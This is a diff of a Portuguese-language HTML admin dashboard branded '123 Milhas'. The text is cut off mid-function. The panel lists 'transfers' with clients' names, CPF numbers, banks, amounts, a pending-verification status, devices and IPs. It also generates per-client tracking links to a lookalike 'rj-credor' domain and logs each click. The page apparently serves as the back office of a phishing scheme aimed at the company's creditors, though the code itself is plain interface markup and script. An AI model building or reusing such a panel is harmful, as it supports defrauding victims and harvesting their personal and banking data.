@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="pt-BR">
-<head>
+  <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Admin Dashboard - 123 Milhas</title>
@@ -8,415 +8,558 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <style>
-        :root {
-            --primary: #f05929;
-            --primary-dark: #d94a1a;
-            --dark: #1a1d24;
-            --darker: #0a0c10;
-            --gray: #2a2d35;
-            --text: #e9ecef;
+      :root {
+        --primary: #f05929;
+        --primary-dark: #d94a1a;
+        --dark: #1a1d24;
+        --darker: #0a0c10;
+        --gray: #2a2d35;
+        --text: #e9ecef;
+      }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        background: var(--darker);
+        color: var(--text);
+        font-family: 'Montserrat', sans-serif;
+      }
+      .navbar-custom {
+        background: var(--dark);
+        padding: 15px 30px;
+        border-bottom: 1px solid var(--gray);
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+      .navbar-custom .brand {
+        font-size: 1.2rem;
+        font-weight: 700;
+        color: var(--primary);
+      }
+      .card-dark {
+        background: var(--dark);
+        border: 1px solid var(--gray);
+        border-radius: 16px;
+        padding: 20px;
+        margin-bottom: 20px;
+      }
+      .card-title {
+        font-size: 1rem;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin-bottom: 20px;
+        color: var(--primary);
+      }
+      .filter-bar {
+        background: var(--gray);
+        border-radius: 12px;
+        padding: 15px;
+        margin-bottom: 20px;
+      }
+      .filter-bar input,
+      .filter-bar select {
+        background: var(--dark);
+        border: 1px solid #3a3d45;
+        color: var(--text);
+        border-radius: 8px;
+        padding: 8px 12px;
+        width: 100%;
+      }
+      .filter-bar input:focus,
+      .filter-bar select:focus,
+      #urlDestino:focus {
+        outline: none;
+        border-color: var(--primary);
+      }
+      .btn-primary-custom {
+        background: var(--primary);
+        border: none;
+        border-radius: 8px;
+        padding: 8px 20px;
+        font-weight: 600;
+        color: white;
+      }
+      .btn-primary-custom:hover {
+        background: var(--primary-dark);
+      }
+      .btn-danger-custom {
+        background: #dc3545;
+        border: none;
+        border-radius: 8px;
+        padding: 6px 15px;
+        font-weight: 600;
+        color: white;
+        font-size: 0.8rem;
+      }
+      .btn-danger-custom:hover {
+        background: #bb2d3b;
+      }
+      .table-dark-custom {
+        background: var(--dark);
+        border-radius: 12px;
+        overflow: hidden;
+        width: 100%;
+      }
+      .table-dark-custom th {
+        background: var(--gray);
+        border: none;
+        font-size: 0.7rem;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        padding: 12px;
+        color: var(--primary);
+      }
+      .table-dark-custom td {
+        border-color: var(--gray);
+        font-size: 0.85rem;
+        vertical-align: middle;
+        padding: 10px;
+        background-color: var(--gray) !important;
+        color: white !important;
+      }
+      .dispositivo-badge {
+        display: inline-block;
+        padding: 2px 8px;
+        border-radius: 12px;
+        font-size: 0.65rem;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      .dispositivo-mobile {
+        background: #17a2b8;
+      }
+      .dispositivo-desktop {
+        background: #6f42c1;
+      }
+      .dispositivo-tablet {
+        background: #fd7e14;
+      }
+      .loading {
+        display: none;
+        text-align: center;
+        padding: 20px;
+      }
+      .loading.show {
+        display: block;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: var(--darker);
-            color: var(--text);
-            font-family: 'Montserrat', sans-serif;
-        }
-        .navbar-custom {
-            background: var(--dark);
-            padding: 15px 30px;
-            border-bottom: 1px solid var(--gray);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        .navbar-custom .brand {
-            font-size: 1.2rem;
-            font-weight: 700;
-            color: var(--primary);
-        }
-        .card-dark {
-            background: var(--dark);
-            border: 1px solid var(--gray);
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        .card-title {
-            font-size: 1rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 20px;
-            color: var(--primary);
-        }
-        .filter-bar {
-            background: var(--gray);
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
-        }
-        .filter-bar input, .filter-bar select {
-            background: var(--dark);
-            border: 1px solid #3a3d45;
-            color: var(--text);
-            border-radius: 8px;
-            padding: 8px 12px;
-            width: 100%;
-        }
-        .filter-bar input:focus, .filter-bar select:focus, #urlDestino:focus {
-            outline: none;
-            border-color: var(--primary);
-        }
-        .btn-primary-custom {
-            background: var(--primary);
-            border: none;
-            border-radius: 8px;
-            padding: 8px 20px;
-            font-weight: 600;
-            color: white;
-        }
-        .btn-primary-custom:hover { background: var(--primary-dark); }
-        .btn-danger-custom {
-            background: #dc3545;
-            border: none;
-            border-radius: 8px;
-            padding: 6px 15px;
-            font-weight: 600;
-            color: white;
-            font-size: 0.8rem;
-        }
-        .btn-danger-custom:hover { background: #bb2d3b; }
-        .table-dark-custom {
-            background: var(--dark);
-            border-radius: 12px;
-            overflow: hidden;
-            width: 100%;
-        }
-        .table-dark-custom th {
-            background: var(--gray);
-            border: none;
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            padding: 12px;
-            color: var(--primary);
-        }
-        .table-dark-custom td {
-            border-color: var(--gray);
-            font-size: 0.85rem;
-            vertical-align: middle;
-            padding: 10px;
-            background-color: var(--gray) !important;
-            color: white !important;
-        }
-        .dispositivo-badge {
-            display: inline-block;
-            padding: 2px 8px;
-            border-radius: 12px;
-            font-size: 0.65rem;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .dispositivo-mobile { background: #17a2b8; }
-        .dispositivo-desktop { background: #6f42c1; }
-        .dispositivo-tablet { background: #fd7e14; }
-        .loading { display: none; text-align: center; padding: 20px; }
-        .loading.show { display: block; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .fa-spin-custom { animation: spin 1s linear infinite; }
-        .nav-tabs-custom {
-            border-bottom: 1px solid var(--gray);
-            margin-bottom: 20px;
-        }
-        .nav-tabs-custom .nav-link {
-            color: var(--text);
-            background: transparent;
-            border: none;
-            padding: 10px 20px;
-            font-weight: 600;
-        }
-        .nav-tabs-custom .nav-link.active {
-            color: var(--primary);
-            border-bottom: 2px solid var(--primary);
-            background: transparent;
-        }
-        .token-card {
-            background: var(--gray);
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 15px;
-            transition: transform 0.2s;
-        }
-        .token-card:hover { transform: translateY(-2px); }
-        .token-display {
-            background: var(--dark);
-            border-radius: 8px;
-            padding: 12px;
-            font-family: monospace;
-            word-break: break-all;
-            margin: 10px 0;
-        }
-        .btn-copy {
-            background: var(--primary);
-            border: none;
-            color: white;
-            padding: 6px 15px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 0.8rem;
-        }
-        .btn-copy:hover { background: var(--primary-dark); }
-        .modal-overlay-custom {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .modal-box-custom {
-            background: var(--dark);
-            border-radius: 20px;
-            padding: 30px;
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-            border: 1px solid var(--primary);
-        }
-        .modal-box-custom i { font-size: 3rem; margin-bottom: 15px; }
-        .modal-box-custom h3 { margin-bottom: 10px; }
-        .modal-box-custom p { margin-bottom: 20px; color: var(--text); opacity: 0.8; }
-        .modal-btn-custom {
-            background: var(--primary);
-            border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
-            color: white;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .modal-btn-custom:hover { background: var(--primary-dark); }
-        .filter-bar input:focus, .filter-bar select:focus,
-        .form-control:focus, input.form-control:focus, select.form-select:focus {
-            outline: none !important;
-            border-color: #f05929 !important;
-            box-shadow: 0 0 0 3px rgba(240, 89, 41, 0.2) !important;
-            background-color: #1a1d24 !important;
-            color: #e9ecef !important;
-        }
-        .filter-bar input::placeholder, .form-control::placeholder, input::placeholder {
-            color: #888888 !important;
-            opacity: 1 !important;
-            font-weight: 400 !important;
-            font-size: 0.85rem !important;
-        }
-        .link-gerado-box {
-            background: linear-gradient(135deg, #1a1d24 0%, #2a2d35 100%);
-            border-left: 4px solid var(--primary);
-        }
-        .short-code {
-            font-family: monospace;
-            font-size: 1.2rem;
-            font-weight: bold;
-            color: var(--primary);
-        }
-        code { font-size: 0.875em; color: #d2d2d2 !important; word-wrap: break-word; }
-        .text-primary { color: #30ea8d !important; }
+      }
+      .fa-spin-custom {
+        animation: spin 1s linear infinite;
+      }
+      .nav-tabs-custom {
+        border-bottom: 1px solid var(--gray);
+        margin-bottom: 20px;
+      }
+      .nav-tabs-custom .nav-link {
+        color: var(--text);
+        background: transparent;
+        border: none;
+        padding: 10px 20px;
+        font-weight: 600;
+      }
+      .nav-tabs-custom .nav-link.active {
+        color: var(--primary);
+        border-bottom: 2px solid var(--primary);
+        background: transparent;
+      }
+      .token-card {
+        background: var(--gray);
+        border-radius: 12px;
+        padding: 20px;
+        margin-bottom: 15px;
+        transition: transform 0.2s;
+      }
+      .token-card:hover {
+        transform: translateY(-2px);
+      }
+      .token-display {
+        background: var(--dark);
+        border-radius: 8px;
+        padding: 12px;
+        font-family: monospace;
+        word-break: break-all;
+        margin: 10px 0;
+      }
+      .btn-copy {
+        background: var(--primary);
+        border: none;
+        color: white;
+        padding: 6px 15px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 0.8rem;
+      }
+      .btn-copy:hover {
+        background: var(--primary-dark);
+      }
+      .modal-overlay-custom {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .modal-box-custom {
+        background: var(--dark);
+        border-radius: 20px;
+        padding: 30px;
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        border: 1px solid var(--primary);
+      }
+      .modal-box-custom i {
+        font-size: 3rem;
+        margin-bottom: 15px;
+      }
+      .modal-box-custom h3 {
+        margin-bottom: 10px;
+      }
+      .modal-box-custom p {
+        margin-bottom: 20px;
+        color: var(--text);
+        opacity: 0.8;
+      }
+      .modal-btn-custom {
+        background: var(--primary);
+        border: none;
+        padding: 10px 20px;
+        border-radius: 8px;
+        color: white;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      .modal-btn-custom:hover {
+        background: var(--primary-dark);
+      }
+      .filter-bar input:focus,
+      .filter-bar select:focus,
+      .form-control:focus,
+      input.form-control:focus,
+      select.form-select:focus {
+        outline: none !important;
+        border-color: #f05929 !important;
+        box-shadow: 0 0 0 3px rgba(240, 89, 41, 0.2) !important;
+        background-color: #1a1d24 !important;
+        color: #e9ecef !important;
+      }
+      .filter-bar input::placeholder,
+      .form-control::placeholder,
+      input::placeholder {
+        color: #888888 !important;
+        opacity: 1 !important;
+        font-weight: 400 !important;
+        font-size: 0.85rem !important;
+      }
+      .link-gerado-box {
+        background: linear-gradient(135deg, #1a1d24 0%, #2a2d35 100%);
+        border-left: 4px solid var(--primary);
+      }
+      .short-code {
+        font-family: monospace;
+        font-size: 1.2rem;
+        font-weight: bold;
+        color: var(--primary);
+      }
+      code {
+        font-size: 0.875em;
+        color: #d2d2d2 !important;
+        word-wrap: break-word;
+      }
+      .text-primary {
+        color: #30ea8d !important;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <div class="navbar-custom">
-        <div class="container-fluid d-flex justify-content-between align-items-center">
-            <div class="brand"><i class="fas fa-chart-line me-2"></i>123 Milhas - Admin Dashboard</div>
-            <div>
-                <span class="badge bg-secondary me-2"><i class="fas fa-calendar"></i> <span id="dataAtual"></span></span>
-                <a href="/" class="btn btn-sm btn-outline-secondary"><i class="fas fa-home"></i> Home</a>
-            </div>
+      <div class="container-fluid d-flex justify-content-between align-items-center">
+        <div class="brand"><i class="fas fa-chart-line me-2"></i>123 Milhas - Admin Dashboard</div>
+        <div>
+          <span class="badge bg-secondary me-2"><i class="fas fa-calendar"></i> <span id="dataAtual"></span></span>
+          <a href="/" class="btn btn-sm btn-outline-secondary"><i class="fas fa-home"></i> Home</a>
         </div>
+      </div>
     </div>
 
     <div class="container-fluid mt-4 px-4">
-        <ul class="nav nav-tabs-custom" id="myTab" role="tablist">
-            <li class="nav-item"><button class="nav-link active" id="transferencias-tab" data-bs-toggle="tab" data-bs-target="#transferencias" type="button" role="tab"><i class="fas fa-exchange-alt me-2"></i>Transferências</button></li>
-            <li class="nav-item"><button class="nav-link" id="links-tab" data-bs-toggle="tab" data-bs-target="#links" type="button" role="tab"><i class="fas fa-link me-2"></i>Links Rastreáveis</button></li>
-            <li class="nav-item"><button class="nav-link" id="cliques-tab" data-bs-toggle="tab" data-bs-target="#cliques" type="button" role="tab"><i class="fas fa-mouse-pointer me-2"></i>Cliques</button></li>
-        </ul>
+      <ul class="nav nav-tabs-custom" id="myTab" role="tablist">
+        <li class="nav-item">
+          <button
+            class="nav-link active"
+            id="transferencias-tab"
+            data-bs-toggle="tab"
+            data-bs-target="#transferencias"
+            type="button"
+            role="tab"
+          >
+            <i class="fas fa-exchange-alt me-2"></i>Transferências
+          </button>
+        </li>
+        <li class="nav-item">
+          <button class="nav-link" id="links-tab" data-bs-toggle="tab" data-bs-target="#links" type="button" role="tab">
+            <i class="fas fa-link me-2"></i>Links Rastreáveis
+          </button>
+        </li>
+        <li class="nav-item">
+          <button class="nav-link" id="cliques-tab" data-bs-toggle="tab" data-bs-target="#cliques" type="button" role="tab">
+            <i class="fas fa-mouse-pointer me-2"></i>Cliques
+          </button>
+        </li>
+      </ul>
 
-        <div class="tab-content">
-            <!-- TAB TRANSFERÊNCIAS -->
-            <div class="tab-pane fade show active" id="transferencias" role="tabpanel">
-                <div class="filter-bar">
-                    <div class="row g-3">
-                        <div class="col-md-3"><input type="text" id="filtroNome" class="form-control" placeholder="Nome do Cliente"></div>
-                        <div class="col-md-2"><input type="text" id="filtroCpf" class="form-control" placeholder="CPF"></div>
-                        <div class="col-md-2"><input type="date" id="filtroDataInicio" class="form-control"></div>
-                        <div class="col-md-2"><input type="date" id="filtroDataFim" class="form-control"></div>
-                        <div class="col-md-2">
-                            <select id="filtroStatus" class="form-select">
-                                <option value="">Todos Status</option>
-                                <option value="pendente_verificacao">Pendente</option>
-                                <option value="concluido">Concluído</option>
-                                <option value="recusado">Recusado</option>
-                            </select>
-                        </div>
-                        <div class="col-md-1"><button class="btn btn-primary-custom w-100" onclick="buscarTransferencias()"><i class="fas fa-search"></i></button></div>
-                    </div>
-                </div>
-                <div class="card-dark">
-                    <div class="loading" id="loading"><i class="fas fa-spinner fa-spin-custom"></i> Carregando...</div>
-                    <div class="table-responsive">
-                        <table class="table table-dark-custom">
-                            <thead><tr><th>Data</th><th>Cliente</th><th>CPF</th><th>Banco</th><th>Valor</th><th>Status</th><th>Dispositivo</th><th>IP</th></tr></thead>
-                            <tbody id="tbodyTransferencias"><tr><td colspan="8" class="text-center">Carregando...</td></tr></tbody>
-                        </table>
-                    </div>
-                </div>
+      <div class="tab-content">
+        <!-- TAB TRANSFERÊNCIAS -->
+        <div class="tab-pane fade show active" id="transferencias" role="tabpanel">
+          <div class="filter-bar">
+            <div class="row g-3">
+              <div class="col-md-3"><input type="text" id="filtroNome" class="form-control" placeholder="Nome do Cliente" /></div>
+              <div class="col-md-2"><input type="text" id="filtroCpf" class="form-control" placeholder="CPF" /></div>
+              <div class="col-md-2"><input type="date" id="filtroDataInicio" class="form-control" /></div>
+              <div class="col-md-2"><input type="date" id="filtroDataFim" class="form-control" /></div>
+              <div class="col-md-2">
+                <select id="filtroStatus" class="form-select">
+                  <option value="">Todos Status</option>
+                  <option value="pendente_verificacao">Pendente</option>
+                  <option value="concluido">Concluído</option>
+                  <option value="recusado">Recusado</option>
+                </select>
+              </div>
+              <div class="col-md-1">
+                <button class="btn btn-primary-custom w-100" onclick="buscarTransferencias()"><i class="fas fa-search"></i></button>
+              </div>
             </div>
-
-            <!-- TAB LINKS RASTREÁVEIS -->
-            <div class="tab-pane fade" id="links" role="tabpanel">
-                <div class="card-dark">
-                    <div class="card-title"><i class="fas fa-plus-circle me-2"></i>Gerar Novo Link Rastreável</div>
-                    <div class="row">
-                        <div class="col-md-4">
-                            <label class="form-label">Nome do Cliente</label>
-                            <input type="text" id="nomeCliente" class="form-control" placeholder="Ex: João Silva">
-                        </div>
-                        <div class="col-md-4">
-                            <label class="form-label">URL de Destino</label>
-                            <input type="text" id="urlDestino" class="form-control" value="https://123milhas-rj-credor.com.br/">
-                        </div>
-                        <div class="col-md-4 d-flex align-items-end gap-2">
-                            <button class="btn btn-primary-custom w-100" onclick="gerarLinkAleatorio()"><i class="fas fa-random me-2"></i>Gerar Link</button>
-                        </div>
-                    </div>
-                    <div id="resultadoLink" style="display: none" class="mt-4">
-                        <div class="token-card link-gerado-box">
-                            <div class="alert alert-success mb-3" style="background: #0a2a1a; border-color: #28a745; color: #28a745">
-                                <i class="fas fa-check-circle me-2"></i><strong>Link gerado com sucesso!</strong>
-                            </div>
-                            <div class="token-display"><small class="text-secondary">Link Curto:</small><br><code id="novoLink" class="short-code"></code></div>
-                            <div class="token-display mt-2"><small class="text-secondary">Código:</small><br><code id="novoCodigo"></code></div>
-                            <div class="mt-3 d-flex gap-2">
-                                <button class="btn-copy" onclick="copiarTexto(document.getElementById('novoLink').innerText)"><i class="fas fa-copy"></i> Copiar Link</button>
-                                <button class="btn-copy" onclick="copiarTexto(document.getElementById('novoCodigo').innerText)"><i class="fas fa-copy"></i> Copiar Código</button>
-                                <button class="btn-copy" onclick="gerarLinkAleatorio()"><i class="fas fa-sync-alt"></i> Gerar Novo</button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="card-dark">
-                    <div class="card-title d-flex justify-content-between align-items-center">
-                        <span><i class="fas fa-list me-2"></i>Links Gerados</span>
-                        <button class="btn btn-danger-custom" onclick="limparTodosLinks()"><i class="fas fa-trash-alt me-1"></i>Limpar Todos</button>
-                    </div>
-                    <div class="table-responsive">
-                        <table class="table table-dark-custom">
-                            <thead><tr><th>Cliente</th><th>Código</th><th>Link Curto</th><th>Data</th><th>Cliques</th><th>Ações</th></tr></thead>
-                            <tbody id="tabelaLinks"><tr><td colspan="6" class="text-center">Carregando...</td></tr></tbody>
-                        </table>
-                    </div>
-                </div>
-
-                <div class="card-dark">
-                    <div class="card-title"><i class="fas fa-chart-bar me-2"></i>Estatísticas</div>
-                    <div class="row text-center" id="campaignStats"></div>
-                </div>
+          </div>
+          <div class="card-dark">
+            <div class="loading" id="loading"><i class="fas fa-spinner fa-spin-custom"></i> Carregando...</div>
+            <div class="table-responsive">
+              <table class="table table-dark-custom">
+                <thead>
+                  <tr>
+                    <th>Data</th>
+                    <th>Cliente</th>
+                    <th>CPF</th>
+                    <th>Banco</th>
+                    <th>Valor</th>
+                    <th>Status</th>
+                    <th>Dispositivo</th>
+                    <th>IP</th>
+                  </tr>
+                </thead>
+                <tbody id="tbodyTransferencias">
+                  <tr>
+                    <td colspan="8" class="text-center">Carregando...</td>
+                  </tr>
+                </tbody>
+              </table>
             </div>
-
-            <!-- TAB CLIQUES -->
-            <div class="tab-pane fade" id="cliques" role="tabpanel">
-                <div class="card-dark">
-                    <div class="card-title"><i class="fas fa-chart-line me-2"></i>Registro de Cliques</div>
-                    <div class="row text-center mb-4" id="cliquesStats"></div>
-                    <div class="table-responsive">
-                        <table class="table table-dark-custom">
-                            <thead><tr><th>Data/Hora</th><th>Cliente</th><th>Código</th><th>Dispositivo</th><th>IP</th></tr></thead>
-                            <tbody id="tbodyCliques"><tr><td colspan="5" class="text-center">Carregando...</td></tr></tbody>
-                        </table>
-                    </div>
-                </div>
-            </div>
+          </div>
         </div>
+
+        <!-- TAB LINKS RASTREÁVEIS -->
+        <div class="tab-pane fade" id="links" role="tabpanel">
+          <div class="card-dark">
+            <div class="card-title"><i class="fas fa-plus-circle me-2"></i>Gerar Novo Link Rastreável</div>
+            <div class="row">
+              <div class="col-md-4">
+                <label class="form-label">Nome do Cliente</label>
+                <input type="text" id="nomeCliente" class="form-control" placeholder="Ex: João Silva" />
+              </div>
+              <div class="col-md-4">
+                <label class="form-label">URL de Destino</label>
+                <input type="text" id="urlDestino" class="form-control" value="https://123milhas-rj-credor.com.br/" />
+              </div>
+              <div class="col-md-4 d-flex align-items-end gap-2">
+                <button class="btn btn-primary-custom w-100" onclick="gerarLinkAleatorio()">
+                  <i class="fas fa-random me-2"></i>Gerar Link
+                </button>
+              </div>
+            </div>
+            <div id="resultadoLink" style="display: none" class="mt-4">
+              <div class="token-card link-gerado-box">
+                <div class="alert alert-success mb-3" style="background: #0a2a1a; border-color: #28a745; color: #28a745">
+                  <i class="fas fa-check-circle me-2"></i><strong>Link gerado com sucesso!</strong>
+                </div>
+                <div class="token-display">
+                  <small class="text-secondary">Link Curto:</small><br /><code id="novoLink" class="short-code"></code>
+                </div>
+                <div class="token-display mt-2"><small class="text-secondary">Código:</small><br /><code id="novoCodigo"></code></div>
+                <div class="mt-3 d-flex gap-2">
+                  <button class="btn-copy" onclick="copiarTexto(document.getElementById('novoLink').innerText)">
+                    <i class="fas fa-copy"></i> Copiar Link
+                  </button>
+                  <button class="btn-copy" onclick="copiarTexto(document.getElementById('novoCodigo').innerText)">
+                    <i class="fas fa-copy"></i> Copiar Código
+                  </button>
+                  <button class="btn-copy" onclick="gerarLinkAleatorio()"><i class="fas fa-sync-alt"></i> Gerar Novo</button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="card-dark">
+            <div class="card-title d-flex justify-content-between align-items-center">
+              <span><i class="fas fa-list me-2"></i>Links Gerados</span>
+              <button class="btn btn-danger-custom" onclick="limparTodosLinks()"><i class="fas fa-trash-alt me-1"></i>Limpar Todos</button>
+            </div>
+            <div class="table-responsive">
+              <table class="table table-dark-custom">
+                <thead>
+                  <tr>
+                    <th>Cliente</th>
+                    <th>Código</th>
+                    <th>Link Curto</th>
+                    <th>Data</th>
+                    <th>Cliques</th>
+                    <th>Ações</th>
+                  </tr>
+                </thead>
+                <tbody id="tabelaLinks">
+                  <tr>
+                    <td colspan="6" class="text-center">Carregando...</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <div class="card-dark">
+            <div class="card-title"><i class="fas fa-chart-bar me-2"></i>Estatísticas</div>
+            <div class="row text-center" id="campaignStats"></div>
+          </div>
+        </div>
+
+        <!-- TAB CLIQUES -->
+        <div class="tab-pane fade" id="cliques" role="tabpanel">
+          <div class="card-dark">
+            <div class="card-title"><i class="fas fa-chart-line me-2"></i>Registro de Cliques</div>
+            <div class="row text-center mb-4" id="cliquesStats"></div>
+            <div class="table-responsive">
+              <table class="table table-dark-custom">
+                <thead>
+                  <tr>
+                    <th>Data/Hora</th>
+                    <th>Cliente</th>
+                    <th>Código</th>
+                    <th>Dispositivo</th>
+                    <th>IP</th>
+                  </tr>
+                </thead>
+                <tbody id="tbodyCliques">
+                  <tr>
+                    <td colspan="5" class="text-center">Carregando...</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
 
     <!-- MODAL DETALHES -->
     <div class="modal fade" id="modalDetalhes" tabindex="-1">
-        <div class="modal-dialog modal-dialog-centered modal-lg">
-            <div class="modal-content bg-dark text-white">
-                <div class="modal-header border-secondary"><h5 class="modal-title"><i class="fas fa-info-circle me-2"></i>Detalhes da Transferência</h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
-                <div class="modal-body" id="modalDetalhesBody"></div>
-            </div>
+      <div class="modal-dialog modal-dialog-centered modal-lg">
+        <div class="modal-content bg-dark text-white">
+          <div class="modal-header border-secondary">
+            <h5 class="modal-title"><i class="fas fa-info-circle me-2"></i>Detalhes da Transferência</h5>
+            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+          </div>
+          <div class="modal-body" id="modalDetalhesBody"></div>
         </div>
+      </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        const modalDetalhes = new bootstrap.Modal(document.getElementById('modalDetalhes'));
+      const modalDetalhes = new bootstrap.Modal(document.getElementById('modalDetalhes'))
 
-        function atualizarData() { document.getElementById('dataAtual').innerHTML = new Date().toLocaleString('pt-BR'); }
-        setInterval(atualizarData, 1000); atualizarData();
+      function atualizarData() {
+        document.getElementById('dataAtual').innerHTML = new Date().toLocaleString('pt-BR')
+      }
+      setInterval(atualizarData, 1000)
+      atualizarData()
 
-        function mostrarModal(titulo, mensagem, tipo = 'info') {
-            const icones = { info: 'fa-info-circle', erro: 'fa-exclamation-triangle', sucesso: 'fa-check-circle', aviso: 'fa-warning' };
-            const cores = { info: '#f05929', erro: '#dc3545', sucesso: '#28a745', aviso: '#ffc107' };
-            const overlay = document.createElement('div');
-            overlay.className = 'modal-overlay-custom';
-            overlay.innerHTML = `<div class="modal-box-custom"><i class="fas ${icones[tipo]}" style="color: ${cores[tipo]}"></i><h3>${titulo}</h3><p>${mensagem}</p><button class="modal-btn-custom" onclick="this.closest('.modal-overlay-custom').remove()">OK</button></div>`;
-            document.body.appendChild(overlay);
+      function mostrarModal(titulo, mensagem, tipo = 'info') {
+        const icones = { info: 'fa-info-circle', erro: 'fa-exclamation-triangle', sucesso: 'fa-check-circle', aviso: 'fa-warning' }
+        const cores = { info: '#f05929', erro: '#dc3545', sucesso: '#28a745', aviso: '#ffc107' }
+        const overlay = document.createElement('div')
+        overlay.className = 'modal-overlay-custom'
+        overlay.innerHTML = `<div class="modal-box-custom"><i class="fas ${icones[tipo]}" style="color: ${cores[tipo]}"></i><h3>${titulo}</h3><p>${mensagem}</p><button class="modal-btn-custom" onclick="this.closest('.modal-overlay-custom').remove()">OK</button></div>`
+        document.body.appendChild(overlay)
+      }
+
+      function copiarTexto(texto) {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard
+            .writeText(texto)
+            .then(() => mostrarModal('Copiado', 'Texto copiado!', 'sucesso'))
+            .catch(() => copiarTextoAlternativo(texto))
+        } else {
+          copiarTextoAlternativo(texto)
         }
+      }
 
-        function copiarTexto(texto) {
-            if (navigator.clipboard && navigator.clipboard.writeText) {
-                navigator.clipboard.writeText(texto).then(() => mostrarModal('Copiado', 'Texto copiado!', 'sucesso')).catch(() => copiarTextoAlternativo(texto));
-            } else { copiarTextoAlternativo(texto); }
+      function copiarTextoAlternativo(texto) {
+        const textarea = document.createElement('textarea')
+        textarea.value = texto
+        textarea.style.position = 'fixed'
+        textarea.style.opacity = '0'
+        document.body.appendChild(textarea)
+        textarea.select()
+        document.execCommand('copy')
+        document.body.removeChild(textarea)
+        mostrarModal('Copiado', 'Texto copiado!', 'sucesso')
+      }
+
+      // ========== TRANSFERÊNCIAS ==========
+      async function buscarTransferencias() {
+        document.getElementById('loading').classList.add('show')
+        const params = new URLSearchParams()
+        const nome = document.getElementById('filtroNome').value.trim()
+        const cpf = document.getElementById('filtroCpf').value.trim()
+        const dataInicio = document.getElementById('filtroDataInicio').value
+        const dataFim = document.getElementById('filtroDataFim').value
+        const status = document.getElementById('filtroStatus').value
+        if (nome) params.append('nome', nome)
+        if (cpf) params.append('cpf', cpf)
+        if (dataInicio) params.append('data_inicio', dataInicio)
+        if (dataFim) params.append('data_fim', dataFim)
+        if (status) params.append('status', status)
+        try {
+          const response = await fetch(`/api/admin/consultar${params.toString() ? '?' + params.toString() : ''}`)
+          const data = await response.json()
+          if (data.success) renderizarTabela(data.transferencias || [])
+          else mostrarModal('Erro', data.error || 'Erro ao carregar dados', 'erro')
+        } catch (error) {
+          mostrarModal('Erro', 'Não foi possível carregar os dados', 'erro')
+        } finally {
+          document.getElementById('loading').classList.remove('show')
         }
+      }
 
-        function copiarTextoAlternativo(texto) {
-            const textarea = document.createElement('textarea');
-            textarea.value = texto;
-            textarea.style.position = 'fixed';
-            textarea.style.opacity = '0';
-            document.body.appendChild(textarea);
-            textarea.select();
-            document.execCommand('copy');
-            document.body.removeChild(textarea);
-            mostrarModal('Copiado', 'Texto copiado!', 'sucesso');
+      function renderizarTabela(transferencias) {
+        const tbody = document.getElementById('tbodyTransferencias')
+        if (!transferencias.length) {
+          tbody.innerHTML = '<tr><td colspan="8" class="text-center text-secondary">Nenhum registro encontrado</td></tr>'
+          return
         }
-
-        // ========== TRANSFERÊNCIAS ==========
-        async function buscarTransferencias() {
-            document.getElementById('loading').classList.add('show');
-            const params = new URLSearchParams();
-            const nome = document.getElementById('filtroNome').value.trim();
-            const cpf = document.getElementById('filtroCpf').value.trim();
-            const dataInicio = document.getElementById('filtroDataInicio').value;
-            const dataFim = document.getElementById('filtroDataFim').value;
-            const status = document.getElementById('filtroStatus').value;
-            if (nome) params.append('nome', nome);
-            if (cpf) params.append('cpf', cpf);
-            if (dataInicio) params.append('data_inicio', dataInicio);
-            if (dataFim) params.append('data_fim', dataFim);
-            if (status) params.append('status', status);
-            try {
-                const response = await fetch(`/api/admin/consultar${params.toString() ? '?' + params.toString() : ''}`);
-                const data = await response.json();
-                if (data.success) renderizarTabela(data.transferencias || []);
-                else mostrarModal('Erro', data.error || 'Erro ao carregar dados', 'erro');
